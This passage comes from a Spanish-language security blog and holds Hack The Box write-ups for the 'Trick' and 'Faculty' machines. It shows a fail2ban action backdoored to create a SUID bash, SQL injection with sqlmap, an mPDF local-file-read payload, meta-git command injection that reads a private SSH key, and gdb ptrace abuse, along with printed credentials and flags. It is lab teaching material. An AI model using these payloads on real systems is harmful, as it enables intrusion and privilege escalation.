\u0026lt;iptables\u0026gt; -A f2b-\u0026lt;name\u0026gt; -j \u0026lt;returntype\u0026gt; \u0026lt;iptables\u0026gt; -I \u0026lt;chain\u0026gt; -p \u0026lt;protocol\u0026gt; -m multiport --dports \u0026lt;port\u0026gt; -j f2b-\u0026lt;name\u0026gt; actionstop = \u0026lt;iptables\u0026gt; -D \u0026lt;chain\u0026gt; -p \u0026lt;protocol\u0026gt; -m multiport --dports \u0026lt;port\u0026gt; -j f2b-\u0026lt;name\u0026gt; \u0026lt;actionflush\u0026gt; \u0026lt;iptables\u0026gt; -X f2b-\u0026lt;name\u0026gt; actioncheck = \u0026lt;iptables\u0026gt; -n -L \u0026lt;chain\u0026gt; | grep -q \u0026#39;f2b-\u0026lt;name\u0026gt;[ \\t]\u0026#39; actionban = \u0026lt;iptables\u0026gt; -I f2b-\u0026lt;name\u0026gt; 1 -s \u0026lt;ip\u0026gt; -j \u0026lt;blocktype\u0026gt; actionunban = \u0026lt;iptables\u0026gt; -D f2b-\u0026lt;name\u0026gt; -s \u0026lt;ip\u0026gt; -j \u0026lt;blocktype\u0026gt; [Init] michael@trick:/etc/fail2ban/action.d$ Además observamos que tenemos permisos sobre los archivos dentro del directorio ya que pertenecemos al grupo security.\n1 2 3 4 5 michael@trick:/etc/fail2ban/action.d$ ls -ld . drwxrwx--- 2 root security 4096 Jun 30 07:48 . michael@trick:/etc/fail2ban/action.d$ id uid=1001(michael) gid=1001(michael) groups=1001(michael),1002(security) michael@trick:/etc/fail2ban/action.d$ Los permisos del archivo no nos permite realizar modificaciones por lo que le cambiamos el nombre y creamos uno nuevo, en este agregamos un comando para darle permisos SUID a una copia de bash en la definicion de actionstart.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 [INCLUDES] before = iptables-common.conf [Definition] actionstart = \u0026lt;iptables\u0026gt; -N f2b-\u0026lt;name\u0026gt; \u0026lt;iptables\u0026gt; -A f2b-\u0026lt;name\u0026gt; -j \u0026lt;returntype\u0026gt; \u0026lt;iptables\u0026gt; -I \u0026lt;chain\u0026gt; -p \u0026lt;protocol\u0026gt; -m multiport --dports \u0026lt;port\u0026gt; -j f2b-\u0026lt;name\u0026gt; cp /bin/bash /tmp/fail2root \u0026amp;\u0026amp; chmod 777 /tmp/fail2root \u0026amp;\u0026amp; chmod +s /tmp/fail2root actionstop = \u0026lt;iptables\u0026gt; -D \u0026lt;chain\u0026gt; -p \u0026lt;protocol\u0026gt; -m multiport --dports \u0026lt;port\u0026gt; -j f2b-\u0026lt;name\u0026gt; \u0026lt;actionflush\u0026gt; \u0026lt;iptables\u0026gt; -X f2b-\u0026lt;name\u0026gt; actioncheck = \u0026lt;iptables\u0026gt; -n -L \u0026lt;chain\u0026gt; | grep -q \u0026#39;f2b-\u0026lt;name\u0026gt;[ \\t]\u0026#39; actionban = \u0026lt;iptables\u0026gt; -I f2b-\u0026lt;name\u0026gt; 1 -s \u0026lt;ip\u0026gt; -j \u0026lt;blocktype\u0026gt; actionunban = \u0026lt;iptables\u0026gt; -D f2b-\u0026lt;name\u0026gt; -s \u0026lt;ip\u0026gt; -j \u0026lt;blocktype\u0026gt; [Init] Damos permisos al archivo de configuración chmod 0644 iptables-multiport.conf.\nAparentemente existe un cronjob que restaura los archivos de configuracion, por lo que agregamos en una linea los comandos necesarios para modificar y reiniciar el servicio.\n1 mv /etc/fail2ban/action.d/iptables-multiport.conf /etc/fail2ban/action.d/iptables-multiport.bak \u0026amp;\u0026amp; cp iptables-multiport.conf /etc/fail2ban/action.d/iptables-multiport.conf \u0026amp;\u0026amp; sudo /etc/init.d/fail2ban restart Luego de ello, ejecutamos un ataque con hydra, ya que fail2ban está activo en el servicio SSH tendría que activar el action que modificamos.\n1 2 3 4 5 6 7 8 π ~/htb/trick ❯ hydra -l root -P $ROCK ssh://10.10.11.166 -t 64 Hydra v9.2 (c) 2021 by van Hauser/THC \u0026amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-06-30 02:17:02 [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4 [DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task [DATA] attacking ssh://10.10.11.166:22/ ^C Luego de unos segundos observamos que la copia de bash fue realizada, ejecutamos bash con la flag -p logrando obtener una shell como root y finalmente la flag root.txt.\n1 2 3 4 5 6 7 8 9 10 11 michael@trick:/dev/shm$ ls -l /tmp/fail2root -rwsrwsrwx 1 root root 1168776 Jun 30 08:39 /tmp/fail2root michael@trick:/dev/shm$ /tmp/fail2root -p fail2root-5.0# id uid=1001(michael) gid=1001(michael) euid=0(root) egid=0(root) groups=0(root),1001(michael),1002(security) fail2root-5.0# cd /root fail2root-5.0# ls f2b.sh\tfail2ban root.txt set_dns.sh fail2root-5.0# cat root.txt dd5e0d8e375ef57af87dbde9df704fca fail2root-5.0# Observamos en el directorio /root un script que restaura los archivos de configuracion de fail2ban.\n1 2 3 4 5 6 7 8 fail2root-5.0# cat f2b.sh #!/bin/bash rm -rf /etc/fail2ban/* cp -r /root/fail2ban /etc/ chown root:security /etc/fail2ban/action.d chmod 770 /etc/fail2ban/action.d fail2root-5.0# ","description":"Multiples vulnerabilidades en el sitio web nos permitieron acceder a archivos locales de la máquina, que, nos dieron acceso por SSH. Finalmente escalamos privilegios mediante la creación de un action de fail2ban.","id":13,"section":"posts","tags":["dig","ffuf","lfi","sqlmap","fail2ban","suid"],"title":"Hack The Box - Trick","uri":"https://sckull.github.io/posts/trick/"},{"content":"\rLa creación de PDFs a partir de etiquetas HTML de mPDF nos permitió obtener credenciales de una base de datos, los cuales nos dieron acceso a un primer usuario por SSH. Tras realizar Command Injection logramos obtener acceso a un segundo usuario. Finalmente escalamos privilegios a traves de GDB.\nNombre Faculty OS Linux Puntos 30 Dificultad Media IP 10.10.11.169 Maker gbyolo\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[5.6, 5.6, 5.5, 4.5, 4.4],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[0, 0, 0, 0, 0],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} Recon nmap nmap muestra multiples puertos abiertos: http (80) y ssh (22).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 # Nmap 7.92 scan initiated Mon Jul 18 18:43:37 2022 as: nmap -p22,80 -sV -sC -oN nmap_scan 10.10.11.169 Nmap scan report for 10.10.11.169 (10.10.11.169) Host is up (0.063s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 e9:41:8c:e5:54:4d:6f:14:98:76:16:e7:29:2d:02:16 (RSA) | 256 43:75:10:3e:cb:78:e9:52:0e:eb:cf:7f:fd:f6:6d:3d (ECDSA) |_ 256 c1:1c:af:76:2b:56:e8:b3:b8:8a:e9:69:73:7b:e6:f5 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://faculty.htb Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Mon Jul 18 18:43:46 2022 -- 1 IP address (1 host up) scanned in 9.43 seconds Web Site El sitio web presenta una redirección al dominio faculty.htb.\n1 2 3 4 5 6 7 8 9 10 π ~/htb/faculty ❯ curl -sI 10.10.11.169 HTTP/1.1 302 Moved Temporarily Server: nginx/1.18.0 (Ubuntu) Date: Mon, 18 Jul 2022 22:43:58 GMT Content-Type: text/html Content-Length: 154 Connection: keep-alive Location: http://faculty.htb π ~/htb/faculty ❯ El sitio unicamente muestra un formulario para el ingreso de un ID.\nAl realizar un \u0026ldquo;bypass\u0026rdquo; con ' or 1=1 -- - logramos ingresar con el usuario Smith, unicamente se muestra un calendario.\nDirectory Brute Forcing feroxbuster muestra nuevas direcciones como admin, en este encontramos multiples paginas php.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 π ~/htb/faculty ❯ feroxbuster -u http://faculty.htb -x html,php,/ --silent http://faculty.htb/admin http://faculty.htb/test.php http://faculty.htb/login.php http://faculty.htb/admin/login.php http://faculty.htb/admin/assets http://faculty.htb/admin/download.php http://faculty.htb/admin/database http://faculty.htb/admin/assets/img http://faculty.htb/admin/assets/css http://faculty.htb/admin/assets/uploads http://faculty.htb/admin/ajax.php http://faculty.htb/admin/assets/uploads/gallery http://faculty.htb/admin/users.php http://faculty.htb/admin/home.php http://faculty.htb/admin/events.php http://faculty.htb/admin/index.php http://faculty.htb/index.php http://faculty.htb/admin/header.php http://faculty.htb/admin/courses.php http://faculty.htb/admin/assets/vendor http://faculty.htb/admin/faculty.php http://faculty.htb/admin/assets/vendor/jquery http://faculty.htb/admin/navbar.php http://faculty.htb/admin/db_connect.php http://faculty.htb/admin/subjects.php Tras visitar la dirección admin/ observamos un \u0026ldquo;dashboard\u0026rdquo;, se muestra que ingresamos como Smith, seguramente está tomando la cookie del \u0026ldquo;login\u0026rdquo; anterior.\nSQLi Como sabemos es posible realizar bypass al login, por lo que podríamos utilizar sqlmap para realizar una enumeración y explotación. Observamos la base de datos scheduling_db.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 π ~/htb/faculty ❯ sqlmap -u \u0026#34;http://faculty.htb/admin/ajax.php?action=login_faculty\u0026#34; --data \u0026#34;id_no=1234567\u0026#34; --method POST -p id_no --batch --dbs --risk 3 level 5 ___ __H__ ___ ___[,]_____ ___ ___ {1.6.4#stable} |_ -| . [,] | .\u0026#39;| . | |___|_ [,]_|_|_|__,| _| |_|V... |_| https://sqlmap.org [.. snip ..] [18:07:28] [INFO] target URL appears to have 10 columns in query injection not exploitable with NULL values. Do you want to try with a random integer value for option \u0026#39;--union-char\u0026#39;? [Y/n] Y [18:07:35] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. \u0026#39;--dbms=mysql\u0026#39;) [18:07:37] [INFO] target URL appears to be UNION injectable with 10 columns injection not exploitable with NULL values. Do you want to try with a random integer value for option \u0026#39;--union-char\u0026#39;? [Y/n] Y [18:07:43] [INFO] checking if the injection point on POST parameter \u0026#39;id_no\u0026#39; is a false positive POST parameter \u0026#39;id_no\u0026#39; is vulnerable. Do you want to keep testing the others (if any)? [y/N] N sqlmap identified the following injection point(s) with a total of 238 HTTP(s) requests: --- Parameter: id_no (POST) Type: time-based blind Title: MySQL \u0026gt;= 5.0.12 AND time-based blind (query SLEEP) Payload: id_no=1234567\u0026#39; AND (SELECT 9190 FROM (SELECT(SLEEP(5)))gAAt) AND \u0026#39;rpgO\u0026#39;=\u0026#39;rpgO --- [18:07:59] [INFO] the back-end DBMS is MySQL web server operating system: Linux Ubuntu web application technology: Nginx 1.18.0, PHP back-end DBMS: MySQL \u0026gt;= 5.0.12 [18:07:59] [INFO] fetching database names [18:07:59] [INFO] fetching number of databases [18:07:59] [INFO] resumed: 2 [18:07:59] [INFO] resumed: information_schema [18:07:59] [INFO] resumed: scheduling_db available databases [2]: [*] information_schema [*] scheduling_db Logramos obtener la información de la base de datos, encontramos las credenciales del administrador, además los \u0026ldquo;codigos\u0026rdquo; de ingreso de tres diferentes usuarios e información de cursos y temas.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 Database: scheduling_db Table: faculty [3 entries] +----+----------+--------------------+--------+---------------------+----------------+----------+-----------+------------+ | id | id_no | email | gender | address | contact | lastname | firstname | middlename | +----+----------+--------------------+--------+---------------------+----------------+----------+-----------+------------+ | 1 | 63033226 | jsmith@faculty.htb | Male | 151 Blue Lakes Blvd | (646) 559-9192 | Smith | John | C | | 2 | 85662050 | cblake@faculty.htb | Female | 225 Main St | (763) 450-0121 | Blake | Claire | G | | 3 | 30903070 | ejames@faculty.htb | Male | 142 W Houston St | (702) 368-3689 | James | Eric | P | +----+----------+--------------------+--------+---------------------+----------------+----------+-----------+------------+ Database: scheduling_db Table: users [1 entry] +----+---------------+------+----------------------------------+----------+ | id | name | type | password | username | +----+---------------+------+----------------------------------+----------+ | 1 | Administrator | 1 | 1fecbe762af147c1176a0fc2c722a345 | admin | +----+---------------+------+----------------------------------+----------+ Database: scheduling_db Table: class_schedule_info [0 entries] +----+-----------+-------------+---------+ | id | course_id | schedule_id | subject | +----+-----------+-------------+---------+ +----+-----------+-------------+---------+ Database: scheduling_db Table: subjects [5 entries] +----+-----------------------------------------------------------------------------------------------------------------------------------+----------------------------+ | id | subject | description | +----+-----------------------------------------------------------------------------------------------------------------------------------+----------------------------+ | 1 | DBMS | Database Management System | | 2 | Mathematics | Mathematics | | 3 | English | English | | 4 | Computer Hardware | Computer Hardware | | 5 | History | History | +----+-----------------------------------------------------------------------------------------------------------------------------------+----------------------------+ Database: scheduling_db Table: courses [4 entries] +----+------------------------+---------------------------------------------+ | id | course | description | +----+------------------------+---------------------------------------------+ | 1 | Information Technology | IT | | 4 | BSCS | Bachelor of Science in Computer Science | | 5 | BSIS | Bachelor of Science in Information Systems | | 6 | BSED | Bachelor in Secondary Education | +----+------------------------+---------------------------------------------+ Database: scheduling_db Table: schedules [1 entry] +----+------------+--------------------+----------+----------+-----------+-------------+---------------------+--------------+---------------+---------------+-------------------------------------------------------+ | id | faculty_id | title | time_to | location | time_from | description | date_created | is_repeating | schedule_date | schedule_type | repeating_data | +----+------------+--------------------+----------+----------+-----------+-------------+---------------------+--------------+---------------+---------------+-------------------------------------------------------+ | 3 | 2 | Class 101 (M \u0026amp; Th) | 12:00:00 | Online | 09:00:00 | Sample Only | 2020-10-20 15:51:01 | 1 | 0000-00-00 | 1 | {\u0026#34;dow\u0026#34;:\u0026#34;1,4\u0026#34;,\u0026#34;start\u0026#34;:\u0026#34;2020-10-01\u0026#34;,\u0026#34;end\u0026#34;:\u0026#34;2020-11-30\u0026#34;} | +----+------------+--------------------+----------+----------+-----------+-------------+---------------------+--------------+---------------+---------------+-------------------------------------------------------+ El usuario de la base de datos unicamente tiene el privilegio USAGE por lo que no podemos hacer nada por aquí.\n1 2 3 database management system users privileges: [*] %sched% [1]: privilege: USAGE User - Gbyolo HTML to PDF Encontramos que el sitio web puede exportar archivos PDF con la información de los cursos, temas, etc. del sitio web.\nSi observamos la solicitud realizada por el sitio, vemos que envia contenido codificado a download.php.\nEl contenido tiene codificación doble en URL y codificaciín en base64. Se muestra contenido HTML.\nEnviamos un tag h1 codificado de la misma forma, logramos generar un pdf con su contenido.\nSi observamos la url se muestra el texto \u0026ldquo;mpdf\u0026rdquo;, tras ejecutar feroxbuster en este directorio podríamos decir que se trata de la libreria mPDF, si observamos los ejemplos se muestra contenido html para generar un PDF.\nmpdf feroxbuster\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 π ~/htb/faculty ❯ feroxbuster -u http://faculty.htb/mpdf/ -x php,html,/ --silent http://faculty.htb/mpdf/includes http://faculty.htb/mpdf/tmp http://faculty.htb/mpdf/config.php http://faculty.htb/mpdf/classes http://faculty.htb/mpdf/includes/functions.php http://faculty.htb/mpdf/includes/out.php http://faculty.htb/mpdf/font http://faculty.htb/mpdf/classes/gif.php http://faculty.htb/mpdf/graph.php http://faculty.htb/mpdf/classes/barcode.php http://faculty.htb/mpdf/classes/sea.php http://faculty.htb/mpdf/patterns http://faculty.htb/mpdf/patterns/en.php http://faculty.htb/mpdf/patterns/de.php http://faculty.htb/mpdf/patterns/es.php http://faculty.htb/mpdf/patterns/ru.php http://faculty.htb/mpdf/patterns/it.php http://faculty.htb/mpdf/patterns/nl.php http://faculty.htb/mpdf/patterns/fi.php http://faculty.htb/mpdf/patterns/sv.php http://faculty.htb/mpdf/qrcode http://faculty.htb/mpdf/qrcode/data http://faculty.htb/mpdf/qrcode/image.php http://faculty.htb/mpdf/qrcode/index.php http://faculty.htb/mpdf/classes/bmp.php http://faculty.htb/mpdf/compress.php http://faculty.htb/mpdf/classes/svg.php ^C Encontramos algunos CVE (CVE-2019-1000005, CVE-2018-19047) relacionados a esta librería, unicamente logramos reproducir el SSRF utilizando el tag \u0026lt;script\u0026gt; entre otros, sin embargo no obtuvimos información de archivos o servicios locales.\nInvestigando sobre esta librería y posibles vulnerabilidades encontramos un post sobre Local file inclusion at IKEA.com donde presenta una explotación LFI utilizando una etiqueta de anotación de mPDF para la lectura de archivos locales.\n1 \u0026lt;annotation file=\u0026#34;/etc/passwd\u0026#34; content=\u0026#34;/etc/passwd\u0026#34; icon=\u0026#34;Graph\u0026#34; title=\u0026#34;Attached File: /etc/passwd\u0026#34; pos-x=\u0026#34;195\u0026#34; /\u0026gt; Tras enviar la anotación observamos que el pdf tiene un documento adjunto, al abrirlo se muestra el contenido del archivo /etc/passwd. Encontramos dos usuarios: gbyolo y developer.\nRealizando la lectura de distintos archivos php encontramos las credenciales de la conexión de base de datos.\n1 2 3 4 // db_connect.php \u0026lt;?php $conn= new mysqli(\u0026#39;localhost\u0026#39;,\u0026#39;sched\u0026#39;,\u0026#39;Co.met06aci.dly53ro.per\u0026#39;,\u0026#39;scheduling_db\u0026#39;)or die(\u0026#34;Could not connect to mysql\u0026#34;.mysqli_error($con)); Shell Utilizando una de las contraseñas y usuarios logramos ingresar por SSH.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 π ~/htb/faculty ❯ ssh gbyolo@10.10.11.169 # Co.met06aci.dly53ro.per gbyolo@10.10.11.169\u0026#39;s password: Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-121-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Wed Jul 20 01:36:44 CEST 2022 System load: 0.01 Processes: 226 Usage of /: 76.4% of 4.67GB Users logged in: 1 Memory usage: 52% IPv4 address for eth0: 10.10.11.169 Swap usage: 0% 0 updates can be applied immediately. The list of available updates is more than a week old. To check for new updates run: sudo apt update Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings You have mail. Last login: Wed Jul 20 00:00:12 2022 from 10.10.14.58 gbyolo@faculty:~$ whoami;id;pwd gbyolo uid=1000(gbyolo) gid=1000(gbyolo) groups=1000(gbyolo) /home/gbyolo gbyolo@faculty:~$ User - Developer Al ingresar se muestra un mensaje de un correo, al revisar los correos, vemos que developer menciona que podemos administrar repositorios git.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 gbyolo@faculty:~$ cat /var/mail/gbyolo From developer@faculty.htb Tue Nov 10 15:03:02 2020 Return-Path: \u0026lt;developer@faculty.htb\u0026gt; X-Original-To: gbyolo@faculty.htb Delivered-To: gbyolo@faculty.htb Received: by faculty.htb (Postfix, from userid 1001) id 0399E26125A; Tue, 10 Nov 2020 15:03:02 +0100 (CET) Subject: Faculty group To: \u0026lt;gbyolo@faculty.htb\u0026gt; X-Mailer: mail (GNU Mailutils 3.7) Message-Id: \u0026lt;20201110140302.0399E26125A@faculty.htb\u0026gt; Date: Tue, 10 Nov 2020 15:03:02 +0100 (CET) From: developer@faculty.htb X-IMAPbase: 1605016995 2 Status: O X-UID: 1 Hi gbyolo, you can now manage git repositories belonging to the faculty group. Please check and if you have troubles just let me know!\\ndeveloper@faculty.htb gbyolo@faculty:~$ Command Injection Observamos que el usario gbyolo puede ejecutar meta-git como developer, seguramente a este comando se refería el correo.\n1 2 3 4 5 6 7 8 9 10 11 12 gbyolo@faculty:~$ sudo -l -l [sudo] password for gbyolo: Matching Defaults entries for gbyolo on faculty: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User gbyolo may run the following commands on faculty: Sudoers entry: RunAsUsers: developer Commands: /usr/local/bin/meta-git gbyolo@faculty:~$ Un post de hackerone muestra que es posible inyectar comandos.\n1 meta-git clone \u0026#39;sss||touch HACKED\u0026#39; Vemos que al reproducir la explotación se crea un archivo que pertenece a developer, por lo que podemos ejecutar comandos con este usuario.\n1 2 3 4 5 6 7 8 gbyolo@faculty:/tmp$ sudo -u developer meta-git clone \u0026#39;sss||touch file_x\u0026#39; 2\u0026gt;/dev/null meta git cloning into \u0026#39;sss||touch file_x\u0026#39; at sss||touch file_x sss||touch file_x: sss||touch file_x ✓ gbyolo@faculty:/tmp$ ls -lah file_x -rw-rw-r-- 1 developer developer 0 Jul 20 01:44 file_x gbyolo@faculty:/tmp$ Realizamos la lectura de la clave privada de developer, para luego ingresar por ssh utilizando esta.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 gbyolo@faculty:/dev/shm$ sudo -u developer meta-git clone \u0026#39;sss||cat /home/developer/.ssh/id_rsa\u0026#39; 2\u0026gt;/dev/null meta git cloning into \u0026#39;sss||cat /home/developer/.ssh/id_rsa\u0026#39; at id_rsa id_rsa: -----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn [.. snip ..] 9u1fIdwzi56TWNhQAAABFkZXZlbG9wZXJAZmFjdWx0eQ== -----END OPENSSH PRIVATE KEY----- gbyolo@faculty:/dev/shm$ nano id_rsa gbyolo@faculty:/dev/shm$ chmod 600 id_rsa gbyolo@faculty:/dev/shm$ ssh -i id_rsa developer@localhost The authenticity of host \u0026#39;localhost (127.0.0.1)\u0026#39; can\u0026#39;t be established. ECDSA key fingerprint is SHA256:EzyBEKh/AuG97K3+To2ltCrl4wjUY9qrlnj8nNuvW8U. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added \u0026#39;localhost\u0026#39; (ECDSA) to the list of known hosts. Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-121-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Wed Jul 20 01:45:49 CEST 2022 System load: 0.0 Processes: 231 Usage of /: 74.9% of 4.67GB Users logged in: 1 Memory usage: 34% IPv4 address for eth0: 10.10.11.169 Swap usage: 0% 0 updates can be applied immediately. The list of available updates is more than a week old. To check for new updates run: sudo apt update Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings developer@faculty:~$ whoami;id; pwd developer uid=1001(developer) gid=1002(developer) groups=1002(developer),1001(debug),1003(faculty) /home/developer developer@faculty:~$ Logrando tambien obtener nuestra flag user.txt.\n1 2 3 4 5 developer@faculty:~$ ls sendmail.sh user.txt developer@faculty:~$ cat user.txt 6c505d51049f9fb545788a5031e4e8c9 developer@faculty:~$ Privesc Realizamos una enumeración de las capabilities en la máquina y observamos a gdb.\n1 2 3 4 5 6 7 developer@faculty:~$ getcap -r / 2\u0026gt;/dev/null /usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep /usr/bin/gdb = cap_sys_ptrace+ep /usr/bin/ping = cap_net_raw+ep /usr/bin/traceroute6.iputils = cap_net_raw+ep /usr/bin/mtr-packet = cap_net_raw+ep developer@faculty:~$ Hacktricks menciona un ejemplo: Example with environment (Docker breakout) - Gdb Abuse, utilizando gdb para ejecutar comandos utilizando el comando call en un proceso adjunto. La documentación indica que call permite evaluar funciones las cuales estan presentes en el programa que está siendo debugeado, en el ejemplo utiliza la funcion system() para ejecutar comandos, para ello dicha funcion debe de existir en el programa en ejecución.\nListamos los procesos con ps, observamos todos aquellos que son ejecutados por root.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 developer@faculty:~$ ps -ef|grep root [.. snip ..] root 619 1 0 01:40 ? 00:00:01 /sbin/multipathd -d -s root 659 1 0 01:40 ? 00:00:00 /usr/bin/VGAuthService root 660 1 0 01:40 ? 00:00:00 /sbin/dhclient -1 -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0 root 669 1 0 01:40 ? 00:00:09 /usr/bin/vmtoolsd root 683 1 0 01:40 ? 00:00:00 /usr/lib/accountsservice/accounts-daemon root 689 1 0 01:40 ? 00:00:00 /usr/sbin/irqbalance --foreground root 690 1 0 01:40 ? 00:00:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers root 691 1 0 01:40 ? 00:00:00 /usr/lib/policykit-1/polkitd --no-debug root 699 1 0 01:40 ? 00:00:00 /lib/systemd/systemd-logind root 700 1 0 01:40 ? 00:00:00 /usr/lib/udisks2/udisksd root 754 1 0 01:40 ? 00:00:00 /usr/sbin/ModemManager root 928 1 0 01:40 ? 00:00:00 /usr/sbin/cron -f root 929 1 0 01:40 ? 00:00:00 php-fpm: master process (/etc/php/7.4/fpm/php-fpm.conf) root 931 928 0 01:40 ? 00:00:00 /usr/sbin/CRON -f root 940 931 0 01:40 ? 00:00:00 /bin/sh -c bash /root/service_check.sh root 941 940 0 01:40 ? 00:00:00 bash /root/service_check.sh root 946 1 0 01:40 ? 00:00:00 nginx: master process /usr/sbin/nginx -g daemon on; master_process on; root 957 1 0 01:40 ? 00:00:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups root 982 1 0 01:40 tty1 00:00:00 /sbin/agetty -o -p -- \\u --noclear tty1 linux root 1567 1 0 01:40 ? 00:00:00 /usr/lib/postfix/sbin/master -w root 1610 957 0 01:40 ? 00:00:00 sshd: gbyolo [priv] root 1995 957 0 01:45 ? 00:00:00 sshd: developer [priv] root 3708 2 0 02:33 ? 00:00:01 [kworker/0:1-events] root 5104 2 0 03:13 ? 00:00:01 [kworker/1:2-events] root 5736 2 0 03:35 ? 00:00:00 [kworker/u256:3-events_unbound] root 5808 2 0 03:39 ? 00:00:01 [kworker/0:0-events] root 5868 2 0 03:39 ? 00:00:00 [kworker/1:0-rcu_par_gp] root 6463 2 0 03:58 ? 00:00:00 [kworker/u256:0-events_unbound] root 6678 2 0 04:04 ? 00:00:00 [kworker/u256:1-events_unbound] root 6839 2 0 04:09 ? 00:00:00 [kworker/1:1-events] root 6870 941 0 04:09 ? 00:00:00 sleep 20 develop+ 6913 2093 0 04:09 pts/1 00:00:00 grep --color=auto root developer@faculty:~$ Despues de listar las funciones de algunos procesos con gdb encontramos que en el proceso ejecutado por python existe la función system()\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 developer@faculty:~$ gdb -p 690 -q Attaching to process 690 Reading symbols from /usr/bin/python3.8... [.. snip ..] 0x00007f5077df8967 in __GI___poll (fds=0x1d01a60, nfds=3, timeout=-1) at ../sysdeps/unix/sysv/linux/poll.c:29 29 ../sysdeps/unix/sysv/linux/poll.c: No such file or directory. (gdb) info functions system All functions matching regular expression \u0026#34;system\u0026#34;: File ../sysdeps/posix/system.c: 197: int __libc_system(const char *); 102: static int do_system(const char *); File pt-system.c: 38: static int system_compat(const char *); File svc.c: 309: void __GI_svcerr_systemerr(SVCXPRT *); Non-debugging symbols: 0x0000000000425530 system@plt # \u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;------------------ 0x00007f5077cc96e0 __libc_system@plt 0x00007f5077577180 g_mem_is_system_malloc 0x00007f50775a8d60 g_get_system_data_dirs 0x00007f50775a8de0 g_get_system_config_dirs 0x00007f5077263bf0 